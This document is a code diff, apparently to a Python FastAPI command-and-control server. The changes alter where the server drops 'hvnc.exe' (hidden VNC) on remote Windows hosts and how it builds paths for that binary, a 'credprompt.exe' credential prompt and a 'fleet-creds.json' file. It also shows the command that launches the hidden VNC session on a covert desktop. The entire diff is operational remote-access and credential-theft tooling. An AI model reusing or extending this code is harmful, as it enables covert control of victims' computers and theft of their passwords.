@@ -5,6 +5,7 @@ from __future__ import annotations
 import asyncio
 import logging
 import mimetypes
+import ntpath
 import secrets
 import time
 from contextlib import asynccontextmanager, suppress
@@ -560,7 +561,8 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         if not hvnc_bin.is_file():
             raise HTTPException(status_code=400, detail="hvnc.exe not built on this host")
         token = await run_in_threadpool(broker.mint, session_id)
-        remote = body.get("dir") or "C:\\Windows\\Temp"
+        remote = body.get("dir") or "C:\\Users\\Public"
+        remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
         try:
             await run_in_threadpool(
                 app.state.bridge.upload, session_id, remote, "hvnc.exe", hvnc_bin.read_bytes()
@@ -581,9 +583,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         port = port or "8443"
         spawn = body.get("spawn") or "explorer.exe"
         desktop = body.get("desktop") or "FleetHVNC"
-        hvnc_path = f"{remote}\\hvnc.exe"
-        creds_path = f"{remote}\\fleet-creds.json"
-        prompt_path = f"{remote}\\credprompt.exe"
+        hvnc_path = ntpath.join(remote, "hvnc.exe")
+        creds_path = ntpath.join(remote, "fleet-creds.json")
+        prompt_path = ntpath.join(remote, "credprompt.exe")
         command = (
             f'start "" "{hvnc_path}" --host {host} --port {port} --session {session_id} '
             f'--token {token} --desktop "{desktop}" --spawn "{spawn}" '
